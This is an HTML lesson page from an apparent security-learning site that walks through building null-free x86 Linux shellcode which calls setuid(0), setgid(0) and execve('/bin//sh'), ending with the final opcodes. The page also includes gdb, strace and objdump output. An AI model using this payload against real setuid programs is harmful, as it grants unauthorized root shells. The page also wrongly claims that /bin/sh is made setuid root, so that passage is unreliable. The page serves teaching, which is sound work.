@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <meta name="description" content="">
+    <meta name="keywords" content="">
+    <title>BlueHood - Cyber Security Learning</title>
+    <!-- Bootstrap -->
+    <link href="../css/bootstrap.min.css" rel="stylesheet">
+    <!-- Style CSS -->
+    <link href="../css/styles.css" rel="stylesheet">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=PT+Serif:400,400i,700,700i" rel="stylesheet">
+    <!-- FontAwesome CSS -->
+    <link rel="stylesheet" type="text/css" href="../css/fontello.css">
+    <link href="../css/font-awesome.min.css" rel="stylesheet">
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+</head>
+
+<body>
+    <div class="header-wrapper">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-2 col-md-2 col-sm-12 col-xs-12">
+                    <a href="index.html"><img src="../images/logo2.png" alt="" style="width:75px;height:75px;" class="alignright"></a>
+                </div>
+                <div class="col-lg-8 col-md-10 col-sm-12 col-xs-12">
+                    <div class="navigation">
+                        <div id="navigation">
+                            <ul>
+                                <li class="active"><a href="../index.html" title="Home">Home</a></li>
+                                <li class="active"><a href="../pentesting.html" title="Penetration Testing">Penetration Testing</a></li>
+                                <li class="active"><a href="../exploitdev.html" title="Exploit Development">Exploit Development</a></li>
+                                <li class="active"><a href="../malware.html" title="Malware">Malware</a></li>
+                                <li class="active"><a href="../shellcode.html" title="Shellcode">Shellcode</a></li>
+                                
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-2 hidden-md hidden-sm hidden-xs">
+                    <div class="header-btn"><a href="#" class="btn btn-header">get started</a></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- header-section close -->
+    <!-- page-header-start -->
+    <div class="page-header">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
+                    <div class="page-section">
+                        <h1 class="page-title ">Shellcode</h1>
+                        <h3 class="page-title ">3.2: Setuid Shell Shellcode </h1>
+                        <div class="page-breadcrumb">
+                            <ol class="breadcrumb">
+                                <li><a href="../exploitdev.html">Shellcode</a></li>
+                                <li>3. BASIC SHELLCODE ON X86 LINUX SYSTEMS</li>
+                                <li>3.2: Setuid Shell Shellcode</li>
+                            </ol>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6 col-md-6 col-sm-6 hidden-xs">
+                    <div class="page-section">
+                         <p>We've seen a simple example of how Shellcode can be written to perform the exit() syscall. This time we will look at writing Shellcode that will spawn a shell for the attacker. </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- page-header-close -->
+    <div class="space-medium">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-md-8 col-sm-8 col-xs-12">
+                    <div class="row">
+                        <div class="col-lg-12 col-sm-12 col-md-12 col-xs-12">
+                            <div class="post-block">
+                                <!-- post holder -->
+                                <div class="post-img">
+                                    <!-- post img -->
+                                    <a href="#" class="imghover"><img src="images/post-img-1.jpg" alt="" class="img-responsive"></a>
+                                </div>
+                                <!-- /.post img -->
+                                <div class="post-content" >
+                                    <!-- post content -->
+                                    <div class="post-header">
+
+                                    </div>
+                                    <!-- /.post header -->
+                                    <p style="color: red;">All the content on this website, including this post, is intended for educational use only. The techniques and processes presented should only be used against systems you own or have explicit written permission to target. Otherwise, you are breaking the Law - be smart. The author/s of this website will not accept any liability for misuse of this content.</p>
+                                    <br>
+                                    <img src="./images/3-2-meme.jpg" alt="" class="img-responsive" style="display:block; margin-right: auto; margin-left: auto;"></a><br><br>
+                                    <p>In particular, we will look at writing setuid() shell spawning Shellcode. Before we proceed we need to understand what a setuid executable is.</p>
+
+                                    <h2> Setuid Binaries </h2>
+                                    <p>Setuid stands for ‘set user ID’ and is an access right that can be applied to executable programs. When executed a setuid binary will run with the permissions of the executable's owner. For instance, if the executable is owned by root and the user debug runs the program the program will run with the privileges of root. Hence if we can exploit a setuid program we will inherit the permissions of the owner of the program. </p>
+                                    <p>Several legitimate programs run with setuid root privileges. For example, /bin/su allows you to log in as another user via a Shell. To check that the password you entered is correct the program must be able to read /etc/shadow which contains hashes of all user's passwords. To do this /bin/su must have root privileges. However, every user must be able to run /bin/sh with root privileges. The solution is to make /bin/sh a setuid binary owned by root - when it is run it will run with root privileges. </p>
+                                    <p>It is important to note that setuid programs do not tend to run all their commands with root privileges. Only commands that need to run with root privileges are run with root privileges - all other commands are run with the users' privileges. In C we can use the setuid() function which will set the user ID (uid) of the process. This can be used to elevate and restore privileges within a setuid binary. </p>
+
+                                    <h2>Step 1: Writing the Shellcode in C </h2>
+                                    <p>Let's look at a C program that will attempt to set the uid and gid (group ID) to root (root has a uid and gid of zero) and then spawn a Shell using the system() function. </p>
+                                    <pre>(c_shell.c)
+
+int main(void)
+{
+setuid(0); setgid(0); system("/bin/bash");
+}</pre>
+                                    <p>If we compile this code it will spawn a Shell, but not with root privileges. </p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ gcc -o c_shell c_shell.c
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ ./c_shell
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ exit
+exit
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ 
+</pre>
+                                    <p>This spawns a shell as the user debug - our current user. This is because the setuid(0) function (and the setgid(0)) function failed to set the uid (gid) of the process to root. This is because we have not set the setuid bit to the c_shell program. Let's change the owner of the binary to root set the setuid bit and see if it works this time.</p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ sudo chown root:root c_shell
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ sudo chmod +s c_shell
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ ./c_shell
+root@lbuntu:~/Documents/shellcode/chapter3/setuid_shell# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),122(sambashare),1000(debug)
+root@lbuntu:~/Documents/shellcode/chapter3/setuid_shell# exit
+exit
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$</pre>
+                                    <p>This time we have a root shell - the setuid() function worked as expected. The program has the necessary permission to change the uid (gid) of the process.</p>
+
+                                    <h2>Step 2: Debugging the Shellcode Program </h2>
+                                    <p>Let's see what system calls the program makes using gdb.</p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ gdb -q ./c_shell
+Reading symbols from ./c_shell...(no debugging symbols found)...done.
+gdb-peda$ disas main
+Dump of assembler code for function main:
+ 0x0000057d &#x3C;+0&#x3E;:&#x9;lea ecx,[esp+0x4]
+ 0x00000581 &#x3C;+4&#x3E;:&#x9;and esp,0xfffffff0
+ 0x00000584 &#x3C;+7&#x3E;:&#x9;push DWORD PTR [ecx-0x4]
+ 0x00000587 &#x3C;+10&#x3E;:&#x9;push ebp
+ 0x00000588 &#x3C;+11&#x3E;:&#x9;mov ebp,esp
+ 0x0000058a &#x3C;+13&#x3E;:&#x9;push ebx
+ 0x0000058b &#x3C;+14&#x3E;:&#x9;push ecx
+ 0x0000058c &#x3C;+15&#x3E;:&#x9;call 0x480 &#x3C;__x86.get_pc_thunk.bx&#x3E;
+ 0x00000591 &#x3C;+20&#x3E;:&#x9;add ebx,0x1a3f
+ 0x00000597 &#x3C;+26&#x3E;:&#x9;sub esp,0xc
+ 0x0000059a &#x3C;+29&#x3E;:&#x9;push 0x0
+ 0x0000059c &#x3C;+31&#x3E;:&#x9;call 0x420 &#x3C;setuid@plt&#x3E;
+ 0x000005a1 &#x3C;+36&#x3E;:&#x9;add esp,0x10
+ 0x000005a4 &#x3C;+39&#x3E;:&#x9;sub esp,0xc
+ 0x000005a7 &#x3C;+42&#x3E;:&#x9;push 0x0
+ 0x000005a9 &#x3C;+44&#x3E;:&#x9;call 0x3f0 &#x3C;setgid@plt&#x3E;
+ 0x000005ae &#x3C;+49&#x3E;:&#x9;add esp,0x10
+ 0x000005b1 &#x3C;+52&#x3E;:&#x9;sub esp,0xc
+ 0x000005b4 &#x3C;+55&#x3E;:&#x9;lea eax,[ebx-0x1970]
+ 0x000005ba &#x3C;+61&#x3E;:&#x9;push eax
+ 0x000005bb &#x3C;+62&#x3E;:&#x9;call 0x400 &#x3C;system@plt&#x3E;
+ 0x000005c0 &#x3C;+67&#x3E;:&#x9;add esp,0x10
+ 0x000005c3 &#x3C;+70&#x3E;:&#x9;mov eax,0x0
+ 0x000005c8 &#x3C;+75&#x3E;:&#x9;lea esp,[ebp-0x8]
+ 0x000005cb &#x3C;+78&#x3E;:&#x9;pop ecx
+ 0x000005cc &#x3C;+79&#x3E;:&#x9;pop ebx
+ 0x000005cd &#x3C;+80&#x3E;:&#x9;pop ebp
+ 0x000005ce &#x3C;+81&#x3E;:&#x9;lea esp,[ecx-0x4]
+ 0x000005d1 &#x3C;+84&#x3E;:&#x9;ret 
+End of assembler dump.
+gdb-peda$ </pre>
+                                    <p>We can see that the functions setuid, setgid and system are being called which is to be expected. Let's catch the syscalls associated with these functions, namely setuid, setgid and execve (for system). </p>
+                                    <pre>gdb-peda$ catch syscall setuid
+Catchpoint 1 (syscall 'setuid' [23])
+gdb-peda$ catch syscall setgid
+Catchpoint 2 (syscall 'setgid' [46])
+gdb-peda$ catch syscall execve
+Catchpoint 3 (syscall 'execve' [11])
+gdb-peda$ r
+Starting program: /home/debug/Documents/shellcode/chapter3/setuid_shell/c_shell 
+
+...
+
+Thread 2.1 "c_shell" hit Catchpoint 3 (call to syscall execve), 0xb7fd7bb5 in __kernel_vsyscall ()
+gdb-peda$ c</pre>
+                                    <p>The syscall to execve is made but we don't see the setuid or setgid syscalls. gdb doesn't run programs as setuid binaries (unless gdb is running as root) so these syscalls fail. We can see the using strace. </p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ strace ./c_shell
+execve("./c_shell", ["./c_shell"], 0xbffff650 /* 22 vars */) = 0
+access("/etc/suid-debug", F_OK) = -1 ENOENT (No such file or directory)
+brk(NULL) = 0x403000
+fcntl64(0, F_GETFD) = 0
+fcntl64(1, F_GETFD) = 0
+fcntl64(2, F_GETFD) = 0
+access("/etc/suid-debug", F_OK) = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd2000
+access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=80054, ...}) = 0
+mmap2(NULL, 80054, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fbe000
+close(3) = 0
+access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+openat(AT_FDCWD, "/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \220\1\0004\0\0\0"..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1942840, ...}) = 0
+mmap2(NULL, 1948188, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7de2000
+mprotect(0xb7fb7000, 4096, PROT_NONE) = 0
+mmap2(0xb7fb8000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d5000) = 0xb7fb8000
+mmap2(0xb7fbb000, 10780, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fbb000
+close(3) = 0
+set_thread_area({entry_number=-1, base_addr=0xb7fd30c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=6)
+mprotect(0xb7fb8000, 8192, PROT_READ) = 0
+mprotect(0x401000, 4096, PROT_READ) = 0
+mprotect(0xb7ffe000, 4096, PROT_READ) = 0
+munmap(0xb7fbe000, 80054) = 0
+<b>setuid32(0)</b> = -1 EPERM (Operation not permitted)
+<b>setgid32(0)</b> = -1 EPERM (Operation not permitted)
+rt_sigaction(SIGINT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=0}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=0}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+clone(child_stack=NULL, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbffff43c) = 2717
+waitpid(2717, debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ exit
+exit
+[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 2717
+rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, NULL, 8) = 0
+rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, NULL, 8) = 0
+rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=2717, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
+exit_group(0) = ?
++++ exited with 0 +++
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell</pre>
+                                    <p>Note that like gdb, strace ignores the setuid bit and runs he program with the users' privileges, which is why the setuid and setgid calls fail with operation not permitted.</p>
+                                    <p>We know that we need to write a program that makes these syscalls with the appropriate arguements written into registers.</p>
+
+                                    <h2> Step 3: Understand How the Assembly Code works </h2>
+                                    We can write an assembly program that does the same thing as our C program. 
+                                    <pre>(shellcode.asm)
+
+section .data 
+
+string db "/bin/shABBBBCCCC" ;string used as an argument for execve
+
+section .text
+
+global _start 
+
+_start:
+
+; setuid syscall
+mov eax, 0x17       ;Arg0: put the value of the syscall into eax
+mov ebx, 0          ;Arg1: put the uid of root into ebx as an argument
+int 0x80            ;call the kernel and run the syscall
+
+; setgid syscall
+mov eax, 0x2e       ;Arg0: put the value of the syscall into eax
+mov ebx, 0          ;Arg1: put the gid of root into ebx as an argument
+int 0x80            ;call the kernel and run the syscall
+
+;execve syscall
+mov eax, 0          ;move zero into eax
+mov ebx, string     ;Arg1:move the address of string into ebx
+mov [ebx + 7], al   ;put the null bytes in al (first byte of eax) into 8th byte of string (where the A is). This will terminate /bin/sh
+mov [ebx + 8], ebx  ;put the address of string, stored in ebx, in place of the BBBB's in string
+mov [ebx + 12], eax ;move the null bytes stored in eax over CCCC in string. This will terminate the preceding address
+mov eax, 11         ;Arg0: put the value of the syscall into eax
+lea ecx, [ebx + 8]  ;Arg2: Load address where BBBB was into ecx. This is a pointer to the address pointing to /bin/sh. 
+lea edx, [ebx + 12] ;Arg3: Load 0x00000000 into edx which replaced CCCC in string
+int 0x80            ;call the kernel and run the syscall</pre>
+                                    <p>Let's go through this assembly code and analyse each part. </p>
+                                    <pre>section .data 
+
+string db "/bin/shABBBBCCCC" ;string used as an argument for execve</pre>
+                                    <p>This defines the data section of the program. We define a variable called string which we use when calling execve. </p>
+                                    <pre>section .text
+
+global _start 
+
+_start:</pre>
+                                    <p>Defines the .text section of the program. Sets the entry point of the program. </p>
+                                    <pre>; setuid syscall
+mov eax, 0x17       ;Arg0: put the value of the syscall into eax
+mov ebx, 0          ;Arg1: put the uid of root into ebx as an argument
+int 0x80            ;call the kernel and run the syscall</pre>
+                                    <p>Runs the setuid syscall. Firstly we load the value of the syscall into eax, in this case, 0x17 (23). We then move the argument of the syscall into ebx; namely the uid of root which is zero. We then call the kernel to run the syscall. </p>
+                                    <pre>; setgid syscall
+mov eax, 0x2e       ;Arg0: put the value of the syscall into eax
+mov ebx, 0          ;Arg1: put the gid of root into ebx as an argument
+int 0x80            ;call the kernel and run the syscall</pre>
+                                    <p>Runs the setgid syscall. Almost identical to the previous syscall except we load 0x2e (the value of the setgid syscall) into eax instead of 0x17.</p>
+                                    <pre>;execve syscall
+mov eax, 0          ;move zero into eax
+mov ebx, string     ;Arg1:move the address of string into ebx
+mov [ebx + 7], al   ;put the null byte in al (first byte of eax) into the 8th byte of string (where the A is). This will terminate /bin/sh
+mov [ebx + 8], ebx  ;put the address of string, stored in ebx, in place of the BBBB's. This is argv[0]
+mov [ebx + 12], eax ;move the null bytes stored in eax over CCCC in string. This is argv[1]
+mov eax, 11         ;Arg0: put the value of the syscall into eax
+lea ecx, [ebx + 8]  ;Arg2: Load address where BBBB was into ecx. This is a pointer to the address pointing to /bin/sh. 
+lea edx, [ebx + 12] ;Arg3: Load 0x00000000 into edx which replaced CCCC in string
+int 0x80 ;call the kernel and run the syscall</pre>
+                                    <p>There is a bit more going on here. Essentially we are overwriting parts of the string variable and loading addresses to parts of the string into registers as arguments to the syscalls. </p>
+                                    <p>Firstly, lets have a look at the man page for execve. </p>
+                                    <pre>EXECVE(2)                 Linux Programmer's Manual                 EXECVE(2)
+
+NAME
+       execve - execute program
+
+SYNOPSIS
+       #include &#x3C;unistd.h&#x3E;
+
+       int execve(const char *filename, char *const argv[],
+                  char *const envp[]);
+
+DESCRIPTION
+       execve()  executes  the program pointed to by filename.  filename must
+       be either a binary executable, or a script starting with a line of the
+       form:
+
+           #! interpreter [optional-arg]
+
+       For details of the latter case, see "Interpreter scripts" below.
+
+argv  is  an  array of argument strings passed to the new program.  By
+       convention, the first of these strings (i.e., argv[0]) should  contain
+       the  filename  associated  with  the  file being executed.  envp is an
+       array of strings, conventionally of  the  form  key=value,  which  are
+       passed  as  environment  to the new program.  The argv and envp arrays
+       must each include a null pointer at the end of the array.</pre>
+                                    <p>As you can see we must pass three arguments the syscall. The first should be a pointer to the filename we want to execute, in this case /bin/sh. This filename should be null terminated otherwise the kernel will read past the file name and our filename will be incorrect. </p>
+                                    <p>The second argument is argv[] which should be “an array of arguments strings  passed to the program”. The first string in the array should be the filename we wish to execute, so in this case /bin/sh. argv[] should contain a null pointer at the end of the array. </p>
+                                    <p>The third arguement is envp[] which should be an array of environment variables passed to the program. We are not interested in this variable. However the envp[] array should contain a null pointer at the end of the array. Therefore, we should pass a null pointer for this variable. </p>
+                                    <p>In our Shellcode, we will null terminate the /bin/sh string and write the argv[] array over the string variable declared in the .data section. We will then pass pointers to /bin/sh and to argv[] via the ebx and ecx registers respectively to the syscall. We also load 0x0b into eax (the value of the syscall) and a null pointer in edx for an empty envp[] array.</p>
+                                    <p>Hence, before we make the syscall, our registers should look like this:</p>
+                                    <pre>execve(pointer to /bin/sh, [address of pointer to /bin/sh, 0], 0)
+
+eax: 11 (value of the execve syscall)
+ebx: pointer to /bin/sh
+ecx: pointer to the argv[] array. 
+edx: null (pointer to envp[] array with no entries) </pre>
+                                    <p>The following goes through the section and explains how we are overwriting the string variable to create the argv[] array and null terminate the /bin/sh string.</p>
+                                    <pre> 
+00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15
+/  b  i  n  /  s  h  A  B  B  B  B  C  C  C  C
+
+    mov eax, 0 
+    mov ebx, string 
+    mov [ebx + 7], al
+
+00 01 02 03 04 05 06 <b>07</b> 08 09 10 11 12 13 14 15
+/  b  i  n  /  s  h  <b>0</b>  B  B  B  B  C  C  C  C
+
+    We've replaced A with 0x00 terminating the /bin/sh string.
+
+    mov [ebx + 8], ebx
+
+00 01 02 03 04 05 06 07 <b>08 09 10 11</b> 12 13 14 15
+ / b  i  n  /  s  h  0  <b>&#x3C;addr of</b>    C  C  C  C
+                        <b>string&#x3E;</b>
+
+    We overwrite the BBBB characters with the address of string (which is stored in ebx). 
+
+    mov [ebx + 12], eax
+
+|---------*-----------| |---------**----------|
+00 01 02 03 04 05 06 07 08 09 10 11 <b>12 13 14 15</b>
+ / b  i  n  /  s  h  0  &#x3C;addr of    <b>0  0  0  0</b>
+                        string&#x3E;
+
+    We overwrite the CCCC characters with the null bytes stored in eax.
+
+* null termianted /bin/sh string
+** argv[] array 
+</pre>
+                                    <p>We we have rewritten the string variable to "bin/sh0&#x3C;addr of string&#x3E;0000". We then load the arguments for the syscall into registers from this string. We have already written one argument into ebx, namely the pointer to '/bin/sh'. We move 0x0b into the eax, the value of the syscall. We load the effective address of the argv[] array into ecx using ebx as a relative address (the argv[] array starts 8 bytes ahead of the address held in ebx). Similarly, we load the effective address of 0x00000000 into edx. We have all the arguments in place and are then ready to make the final syscall. 
+</p>
+                                    <p>Let's compile the program, make it setuid root and see if it works. </p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ nasm -f elf shellcode.asm
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ ld shellcode.o -o a1.out
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ sudo chown root a1.out
+[sudo] password for debug: 
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ sudo chmod +s a1.out 
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ ./a1.out 
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),122(sambashare),1000(debug)
+# </pre>
+                                    <p>Indeed we get a root shell. The program works. However, we are still a long way from injectable Shellcode. We are relying on data held in the .data section of the program. Typically we will not be able (and we certainly would like to avoid) writing to the .data section of the program. We will get around this by writing the /bin/sh argument to the Stack and referencing it from there rather than the .data section of the program. We also need to remove all null bytes from the program. </p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ objdump -d a1.out 
+
+a1.out: file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048080 <_start>:
+ 8048080:   b8 17 00 00 00 mov $0x17,%eax
+ 8048085:   bb 00 00 00 00 mov $0x0,%ebx
+ 804808a:   cd 80 int $0x80
+ 804808c:   b8 2e 00 00 00 mov $0x2e,%eax
+ 8048091:   bb 00 00 00 00 mov $0x0,%ebx
+ 8048096:   cd 80 int $0x80
+ 8048098:   b8 00 00 00 00 mov $0x0,%eax
+ 804809d:   bb b8 90 04 08 mov $0x80490b8,%ebx
+ 80480a2:   88 43 07 mov %al,0x7(%ebx)
+ 80480a5:   89 5b 08 mov %ebx,0x8(%ebx)
+ 80480a8:   89 43 0c mov %eax,0xc(%ebx)
+ 80480ab:   b8 0b 00 00 00 mov $0xb,%eax
+ 80480b0:   8d 4b 08 lea 0x8(%ebx),%ecx
+ 80480b3:   8d 53 0c lea 0xc(%ebx),%edx
+ 80480b6:   cd 80 int $0x80
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ </pre>
+
+                                    <br>
+                                    <h2> Step 4: Cleaning Up our Shellcode </h2>
+                                    <p>Let's firstly remove all null bytes from the first two syscalls. </p>
+                                    <pre>;setuid(0)
+push 0x17       ;push the value of 0x17 onto the Stack
+pop eax         ;Arg1: push the value at the top of the Stack, 0x17, into eax
+xor ebx, ebx    ;Arg2: set ebx to zero
+int 0x80        ;call the kernel</pre>
+                                    <p>We are using a new technique here - we push 0x17 onto the Stack and then pop this value into eax. This loads 0x17 into eax with fewer opcodes than xor eax,eax ; mov al, 0x17 for example. This is a good technique to load values into registers when we need to zero them first (i.e. we only want to write to the first byte and we don't know what else is in the register). </p>
+                                    <p>We then set ebx to zero by xoring ebx with itself. We then call the kernel which hasn't changed. </p>
+                                    <pre>;setgid(0)
+mov al, 0x2e    ;Arg1: move 0x2e into eax - value of the syscall. We don't use the push, pop method as we know the first three bytes of eax are null
+int 0x80        ;call the kernel. Arg2 already set to zero from above</pre>
+                                    <p>We set eax to 0x2e using the mov al method. We don't use the push, pop method as we know the first three bytes of eax are null from the previous syscall. We then call the kernel. Note that we do not need to set ebx to zero as we did before - it already is zero. </p>
+                                    <pre>
+;execve syscall
+mov al, 0x0b    ;Arg1: move 11 into eax - value of the syscall
+push ebx        ;push four null bytes to the Stack to terminate the following string
+push 0x68732f2f ;push //sh onto the Stack
+push 0x6e69622f ;push /bin onto the Stack (to complete the string /bin//sh
+mov ebx, esp    ;Arg1: move the address of /bin//sh into ebx. esp points to this address
+xor edx, edx    ;Arg3: set edx to zero
+push edx        ;push four null bytes to the Stack to terminate the following address
+push ebx        ;push the address stored in ebx (which points to /bin//sh) onto the Stack
+mov ecx, esp    ;Arg2: move the address of the pointer to /bin//sh into ecx.
+int 0x80        ;call the kernel</pre>
+                                    <p>This section of code pushes the string /bin//sh onto the Stack and loads arguments into registers before the execve syscall. But why are we loading /bin//sh onto the Stack instead of /bin/sh? </p>
+                                    <p>In 32bit Linux systems we push values onto the Stack in units of 4 bytes (note it is possible, but not common, to pop or push 16 bits as well). That means that if value if 3 bytes long it will still take up 4 bytes worth of space on the Stack. Space not used will be null bytes. Our problem is that the string “/bin/sh" is 7 bytes long. It has to be written to the Stack in units of 4 so we will have to write to the Stack twice. The first write will be 4 bytes long and the second write will be 3 bytes long. However this will introduce a null byte in the string, “/bin0/sh” which will terminate our string early and the wrong arguments will be passed to execve. </p>
+                                    <p>However, we have a trick up our sleeve. In Linux when issuing commands like /bin/sh the OS will accept multiple slashes in place of one. 
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ /bin/sh
+$ exit
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ /bin//sh
+$ exit
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ /bin////////sh
+$ exit
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$</pre>
+                                    <p>Hence the command /bin/sh has the same effect as /bin//sh (or even /bin////////sh). Hence we can write exactly 8 bytes to the Stack (in units of 4 bytes) using the string /bin//sh. A neat trick.</p>
+                                    <p>In the assembly code, we first move 0x0b into eax (using the al register), the value of the syscall. We then push 4 null bytes stored in ebx onto the Stack to terminate the following string written onto the Stack. We then write //sh and /bin onto the Stack in hexadecimal (using little-endian format). Since the Stack is a last in first out data type we have to write the string backwards in units of 4 bytes (i.e //sh first then /bin). The program moves the address of /bin//sh into ebx (from esp). We set edx to zero and push 4 null bytes into the Stack to terminate the argv[] array. Push the address in ebx (which points to /bin//sh) on the Stack. Then move the address of the pointer to /bin//sh into ecx (this is a pointer to the argv array) and call the kernel. This will spawn a shell. Since we have set the uid and gid of the program to root (zero) we will have a root shell (providing the binary is setuid).</p>
+                                    <p>Compiling the assembly and setting the setuid bit (and ensuring the owner is root) we see that we get a root shell.</p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ nasm -f elf shellcode2.asm
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ sudo ld shellcode2.o -o a1.out
+[sudo] password for debug: 
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ sudo chmod +s a1.out 
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ ./a1.out
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),122(sambashare),1000(debug)
+# exit
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ </pre>
+
+                                    <p>So the Shellcode works! Let's check that the Shellcode does not contain any null bytes. </p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ objdump -d a1.out
+
+a1.out: file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:   6a 17 push $0x17
+ 8048062:   58 pop %eax
+ 8048063:   31 db xor %ebx,%ebx
+ 8048065:   cd 80 int $0x80
+ 8048067:   b0 2e mov $0x2e,%al
+ 8048069:   cd 80 int $0x80
+ 804806b:   b0 0b mov $0xb,%al
+ 804806d:   53 push %ebx
+ 804806e:   68 2f 2f 73 68 push $0x68732f2f
+ 8048073:   68 2f 62 69 6e push $0x6e69622f
+ 8048078:   89 e3 mov %esp,%ebx
+ 804807a:   31 d2 xor %edx,%edx
+ 804807c:   52 push %edx
+ 804807d:   53 push %ebx
+ 804807e:   89 e1 mov %esp,%ecx
+ 8048080:   cd 80 int $0x80
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$</pre>
+                                    <p>Indeed there are no null bytes in our Shellcode. All that remains is to extract the opcodes and we have our Shellcode. </p>
+                                    <p>One thing to note is that our Shellcode will fail if the binary we are attacking does not have the setuid bit set. Indeed if we remove the setuid bit from a1.out we will get a segmentation fault. This is because we have not programmed any error handling if the setuid() syscall fails. After all, we do not have the correct privileges. You need to bear this in mind if the binary you are attacking is not setuid. </p>
+                                    <pre>debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ sudo chmod -s a1.out
+debug@lbuntu:~/Documents/shellcode/chapter3/setuid_shell$ ./a1.out 
+Segmentation fault (core dumped)
